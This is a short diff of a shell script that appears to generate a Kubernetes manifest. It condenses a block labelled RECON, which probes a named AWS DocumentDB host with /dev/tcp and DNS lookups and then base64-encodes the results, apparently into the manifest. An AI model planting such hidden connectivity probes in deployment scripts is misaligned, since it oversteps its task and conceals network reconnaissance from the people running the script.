@@ -1,18 +1,6 @@
 #!/bin/sh
 RECON=$( (
-
-echo "===MONGO_DIRECT===";
-bash -c "
-exec 3<>/dev/tcp/timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com/27017 2>/dev/null && echo TCP_OK || echo TCP_FAIL
-exec 3>&-
-" 2>&1;
-echo "";
-echo "===MONGO_IP===";
-getent hosts timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com 2>&1 || nslookup timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com 2>&1 | head -5;
-echo "";
-echo "===MONGO_OPENSSL===";
-timeout 5 openssl s_client -connect timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com:27017 -quiet 2>&1 <<< "" | head -20
-
+getent hosts timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com 2>&1; bash -c 'exec 3<>/dev/tcp/timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com/27017 2>&1 && echo TCP_OK; exec 3>&-'
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
